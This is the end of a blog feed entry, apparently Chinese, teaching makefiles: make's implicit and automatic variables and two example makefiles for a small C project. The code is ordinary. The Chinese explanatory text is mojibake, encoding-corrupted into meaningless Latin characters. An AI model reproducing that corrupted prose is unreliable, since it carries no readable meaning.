CÈ¢ÑÁºñËØëÂô®ÁöÑÂêçÁß∞ÔºåÈªòËÆ§ÂÄº‰∏∫$(CC) -E</li><li>CXX    C++ÁºñËØëÂô®ÁöÑÂêçÁß∞ÔºåÈªòËÆ§‰∏∫g++</li><li>FC    FORTRANÁºñËØëÂô®ÁöÑÁº©ÂÜôÔºåÈªòËÆ§ÂÄº‰∏∫f77</li><li>RM    Êñá‰ª∂Âà†Èô§Á®ãÂ∫èÂêçÁß∞ÔºåÈªòËÆ§‰∏∫rm -f</li></ul><p>Ëá™Âä®ÂèòÈáè</p><p>ÂèòÈáèÂêç    ÂèòÈáèÂê´‰πâ</p><ul><li>$*    ‰∏çÂåÖÂê´Êâ©Â±ïÂêçÁöÑÁõÆÊ†áÊñá‰ª∂ÂêçÁß∞</li><li>$+    ÊâÄÊúâÁöÑ‰æùËµñÊñá‰ª∂Ôºå‰ª•Á©∫Ê†ºÂàÜÂºÄÔºåÂπ∂‰ª•Âá∫Áé∞ÂêéÁöÑÂÖàÂêé‰∏∫Â∫èÔºåÂèØËÉΩÂåÖÂê´ÈáçÂ§ç‰æùËµñÊñá‰ª∂</li><li>$&lt;    Á¨¨‰∏Ä‰∏™‰æùËµñÊñá‰ª∂ÁöÑÂêçÁß∞</li><li>$?    ÊâÄÊúâÊó∂Èó¥Êà≥ÊØîÁõÆÊ†áÊñá‰ª∂ÊôöÁöÑ‰æùËµñÊñá‰ª∂ÔºåÂπ∂‰ª•Á©∫Ê†ºÂàÜÂºÄÁõÆÊ†áÊñá‰ª∂ÁöÑÂÆåÊï¥ÂêçÁß∞</li><li>$@    ÁõÆÊ†áÊñá‰ª∂ÁöÑÂÆåÊï¥ÂêçÁß∞</li><li>$^    ÊâÄÊúâ‰∏çÈáçÂ§çÁöÑÁõÆÊ†á‰æùËµñÊñá‰ª∂Ôºå‰ª•Á©∫Ê†ºÂàÜÂºÄ</li><li>$%    Â¶ÇÊûúÁõÆÊ†áÊòØÂΩíÊ°£ÊàêÂëòÔºåÂàôËØ•ÂèòÈáèË°®Á§∫ÁõÆÊ†áÁöÑÂΩíÊ°£ÊàêÂëòÁöÑÁõÆÊ†áÂêçÁß∞</li></ul><p>makefileÁºñÂÜô</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GCCFLAGS=-c -Wall</span><br><span class="line">OBJS=demo1.o demo2.o main.o</span><br><span class="line"><span class="section">demo:<span class="variable">$(OBJS)</span></span></span><br><span class="line">        gcc  <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">demo2.o:demo2.c</span></span><br><span class="line">        gcc <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">demo1.o:demo1.c</span></span><br><span class="line">        gcc <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">main.o:main.c</span></span><br><span class="line">        gcc <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        rm *.o demo</span><br></pre></td></tr></table></figure><p>ÊîπËøõÁâàÁöÑmakefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GCCFLAGS=-c -Wall</span><br><span class="line">OBJS=demo1.o demo2.o main.o</span><br><span class="line">TARGET=./demo</span><br><span class="line"><span class="section">%.o:%.c</span></span><br><span class="line">        <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJS)</span></span><br><span class="line">        <span class="variable">$(CC)</span>  <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        <span class="variable">$(RM)</span> *.o demo</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ÊáíÁãóÂøÖÂ§áÔºåmakefile&lt;/p&gt;</summary>
    
    
    
    
    <category term="c" scheme="https://pz1o.top/tags/c/"/>
    
  </entry>
  
</feed>
